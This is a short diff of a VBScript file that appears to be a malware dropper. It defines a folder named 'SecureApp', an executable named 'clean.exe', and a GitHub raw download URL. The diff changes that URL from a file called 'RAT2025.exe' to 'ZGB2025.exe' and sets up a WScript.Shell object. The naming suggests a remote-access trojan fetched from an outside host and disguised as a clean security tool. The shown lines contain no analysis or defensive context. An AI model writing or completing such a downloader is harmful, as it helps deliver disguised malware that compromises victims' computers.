@@ -3,7 +3,7 @@ Option Explicit
 Dim TARGET_DIR_NAME, EXE_NAME, DOWNLOAD_URL
 TARGET_DIR_NAME = "SecureApp"
 EXE_NAME = "clean.exe"
-DOWNLOAD_URL = "https://github.com/Romania123456/bom/raw/refs/heads/main/RAT2025.exe"
+DOWNLOAD_URL = "https://github.com/Romania123456/bom/raw/refs/heads/main/ZGB2025.exe"
 
 Dim WshShell, fso
 Set WshShell = CreateObject("WScript.Shell")
